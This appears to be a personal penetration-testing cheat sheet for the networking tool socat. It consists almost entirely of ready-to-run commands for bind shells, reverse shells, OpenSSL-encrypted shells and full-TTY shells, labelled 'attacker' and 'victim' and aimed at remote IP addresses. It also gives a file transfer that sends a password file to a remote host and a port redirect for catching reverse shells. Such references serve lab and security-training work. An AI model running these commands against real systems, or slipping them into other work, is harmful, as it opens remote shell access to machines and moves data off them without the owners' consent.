#network #tool #openssl #reverseShells 

https://gtfobins.github.io/gtfobins/socat/

### Basic listen and connect

```bash
socat - TCP4:192.168.1.2:80 ## connect to a remote port 
```

```bash 
sudo socat TCP4-LISTEN:443 STDOUT ## listen in 443 
```

### File transfers 

```bash 
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt ##file to be transfered 
```

```bash
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create ## received file
```

### Bind Shell

```bash
socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
```



### Reverse shell

```bash
socat -d -d TCP4-LISTEN:443 STDOUT ## listening for the reverse connection
```

```bash
socat TCP4:10.11.0.22:443 EXEC:/bin/bash ## connecting back
```

### Encrypted shell

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```

```bash
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash ## listner can also use STDIO
```

```bash
socat - OPENSSL:10.11.0.4:443,verify=0 ##connection initiated
```



### Full TTY 

**Reverse Shell** 

```bash
socat file:`tty`,raw,echo=0 tcp-listen:12345 ##attacker
```

```bash
socat tcp-connect:$RHOST:$RPORT exec:/bin/bash,pty,stderr,setsid,sigint,sane ##victim
```


**Bind Shell**

```bash
socat FILE:`tty`,raw,echo=0 TCP:192.168.188.52:60000 ##attacker
```

```bash
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane ##victim
```





### Port Redirections(Catching a reverseshell)

```bash
socat -ddd TCP-LISTEN:2345,fork,reuseaddr TCP:10.4.50.215:5432
```
